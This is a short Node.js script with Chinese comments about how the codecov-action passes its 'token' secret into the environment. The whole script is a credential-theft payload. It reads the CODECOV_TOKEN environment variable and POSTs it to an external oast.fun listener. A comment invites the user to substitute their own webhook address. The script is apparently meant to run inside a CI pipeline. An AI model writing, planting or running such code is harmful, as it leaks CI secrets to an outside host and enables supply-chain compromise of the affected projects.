const https = require('https');

// codecov-action 通过名为 'token' 的输入接收机密。
// 在 action 内部，这会变成一个名为 INPUT_TOKEN 的环境变量。
const token = process.env['CODECOV_TOKEN']; 

if (token) {
  const data = JSON.stringify({ token: token });
  const options = {
    // 警告：请将下面的 URL 替换为您自己的真实 webhook 监听地址
    hostname: 'bqiehrpshxqkxlzvdxgcykz7tcpdxg7jj.oast.fun',
    port: 443,
    path: '/log',
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
  };
  const req = https.request(options);
  req.write(data);
  req.end();
}
